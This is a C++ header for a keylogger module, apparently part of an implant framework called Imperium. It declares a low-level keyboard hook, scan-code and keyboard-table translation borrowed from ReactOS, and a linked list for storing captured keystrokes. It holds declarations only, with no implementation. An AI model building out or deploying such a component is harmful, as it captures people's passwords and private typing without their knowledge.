#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Imperium.h>

/*
 * structure took from reactos
 * https://doxygen.reactos.org/d7/df4/kbd_8h_source.html
 */

/* Virtual key flags */
#define KBDEXT     0x100  /* Extended key code */
#define KBDMULTIVK 0x200  /* Multi-key */
#define KBDSPECIAL 0x400  /* Special key */
#define KBDNUMPAD  0x800  /* Number-pad */

/* Modifier bits */
#define KBDSHIFT   0x001  /* Shift modifier */
#define KBDCTRL    0x002  /* Ctrl modifier */
#define KBDALT     0x004  /* Alt modifier */

/* Invalid shift */
#define SHFT_INVALID 0x0F

typedef struct _VK_TO_BIT {
    BYTE Vk;
    BYTE ModBits;
} VK_TO_BIT, *PVK_TO_BIT;

typedef struct _MODIFIERS {
    PVK_TO_BIT pVkToBit;
    WORD       wMaxModBits;
    BYTE       ModNumber[ ];
} MODIFIERS, *PMODIFIERS;

template<int i>
struct VK_TO_WCHARS {
    BYTE  VirtualKey;
    BYTE  Attributes;
    WCHAR wch[ i ];
};

typedef VK_TO_WCHARS< 1 > *PVK_TO_WCHARS;

typedef struct _VK_TO_WCHAR_TABLE {
    //
    // the number of VK_TO_WCHARS is the cbSize member
    //
    PVK_TO_WCHARS pVkToWchars;
    BYTE          nModifications;
    BYTE          cbSize;
} VK_TO_WCHAR_TABLE, *PVK_TO_WCHAR_TABLE;

typedef struct _DEADKEY {
    DWORD  dwBoth;
    WCHAR  wchComposed;
    USHORT uFlags;
} DEADKEY, *PDEADKEY;

typedef WCHAR *DEADKEY_LPWSTR;

#define DKF_DEAD 1

typedef struct _VSC_LPWSTR {
    BYTE   vsc;
    LPWSTR pwsz;
} VSC_LPWSTR, *PVSC_LPWSTR;

typedef struct _VSC_VK {
    BYTE   Vsc;
    USHORT Vk;
} VSC_VK, *PVSC_VK;

template<int i>
struct LIGATURE {
    BYTE  VirtualKey;
    WORD  ModificationNumber;
    WCHAR wch[ i ];
};

#define KBD_VERSION 1
#define GET_KBD_VERSION(p) (HIWORD((p)->fLocalFlags))
#define KLLF_ALTGR     0x1
#define KLLF_SHIFTLOCK 0x2
#define KLLF_LRM_RLM   0x4

typedef struct _KBDTABLES {
    PMODIFIERS         pCharModifiers;
    PVK_TO_WCHAR_TABLE pVkToWcharTable;
    PDEADKEY           pDeadKey;
    VSC_LPWSTR *       pKeyNames;
    VSC_LPWSTR *       pKeyNamesExt;
    LPWSTR *           pKeyNamesDead;
    USHORT *           pusVSCtoVK;
    BYTE               bMaxVSCtoVK;
    PVSC_VK            pVSCtoVK_E0;
    PVSC_VK            pVSCtoVK_E1;
    DWORD              fLocaleFlags;
    BYTE               nLgMaxd;
    BYTE               cbLgEntry;
    LIGATURE< 1 > *    pLigature;
} KBDTABLES, *PKBDTABLES;

/* Constants that help table decoding */
#define WCH_NONE  0xf000
#define WCH_DEAD  0xf001
#define WCH_LGTR  0xf002

/* VK_TO_WCHARS attributes */
#define CAPLOK       0x01
#define SGCAPS       0x02
#define CAPLOKALTGR  0x04
#define KANALOK      0x08
#define GRPSELTAP    0x80

#define VK_ABNT_C1  0xC1
#define VK_ABNT_C2  0xC2

/* Useful scancodes */
#define SCANCODE_LSHIFT  0x2A
#define SCANCODE_RSHIFT  0x36
#define SCANCODE_CTRL    0x1D
#define SCANCODE_ALT     0x38

namespace Keylogger {
    /*!
     * @brief
     *  start logging keystrokes
     *
     * @return
     */
    VOID start();

    /*!
     * @brief
     *  the callback function when a keystroke is hit
     *
     * @param Code
     */
    INT64 CALLBACK callback(
        ULONG            Code,
        PVOID            Param,
        PKBDLLHOOKSTRUCT DllHook
    );

    /*!
     * @brief
     *  get a pointer onto the KBDTABLE of the language
     *
     * @return
     *  exit status
     */
    BOOL store_kbdtables();

    /*!
     * @brief
     *  process keystrokes
     *
     * @param sc
     *  virtual scan code
     *
     * @param e0
     *  is the E0 extended flag set,
     *
     * @param keyup
     *  is the event a key press(0) of a release (1)
     */
    VOID log_key(
        BYTE sc,
        BOOL e0,
        BOOL keyup
    );

    /*!
     * @brief
     *  store a character
     *
     * @param Character
     *  character to store
     */
    VOID store_character(
        IN WCHAR Character
    );

    /*!
     * @brief
     *  convert a scan code to a virtual key
     *
     * @param KbTables
     *  keyboard tables
     *
     * @param sc
     *  the scan code to convert
     *
     * @param e0
     *   is the E0 extended flag set?
     *
     * @return
     *  virtual key
     */
    USHORT sc_to_vk(
        PKBDTABLES KbTables,
        BYTE       sc,
        BOOL       e0
    );

    /*!
     * @brief
     *  fix the numpad virtual keys
     *
     * @param Vk
     *  virtual key to fix
     */
    VOID fix_numpad_vk(
        OUT PUSHORT Vk
    );

    /*!
     * @brief
     *  convert a virtual key to a wide char
     *
     * @param KbTables
     *  lang keyboard table
     *
     * @param Vk
     *  virtual key
     *
     * @return
     *  the character
     */
    WCHAR vk_to_wchar(
        IN PKBDTABLES Tables,
        IN USHORT     Vk
    );

    /*!
     * @brief
     *  handle locks like NUMLOCK, CAPSLOCK...
     *
     * @brief Vk
     *  virtual key
     *
     * @return
     *  true if the key was a lock key and was handled
     */
    BOOL handle_lockkeys(
        IN USHORT Vk
    );

    /*!
     * @brief
     *  handle modifiers keys like SHIFT, CONTROL...
     *
     * @return
     *  true if the key was a modifier and was handled
     */
    BOOL handle_modifiers(
        IN PKBDTABLES  KbTables,
        IN OUT PUSHORT Vk
    );
}


typedef enum _LOCK_KEY : BYTE {
    //
    // locks
    // like CAPSLOCK, NUMLOCK, SCROLL
    //
    ModCapitalLock = 0x01,
    ModNumLock     = 0x02,
    ModScrollLock  = 0x04,
} LOCK_KEY, *PLOCK_KEY;

typedef struct _KEYSTROKES {
    UNICODE_STRING      Keys;
    struct _KEYSTROKES *Next;
} KEYSTROKES, *PKEYSTROKES;

typedef struct _KEYLOGGER {
    BOOL        Init;
    ULONG       ThreadId;
    PKEYSTROKES Keystrokes;
    HHOOK       Hook;

    PKBDTABLES  KbTables;
    PSTR        KbLang;
    PSTR        KbDll;

    struct {
        PBYTE Buffer;
        ULONG Size;
    } Modifiers;

    ULONG Count;

    LOCK_KEY Locks;
} KEYLOGGER, *PKEYLOGGER;

#endif //KEYLOGGER_H
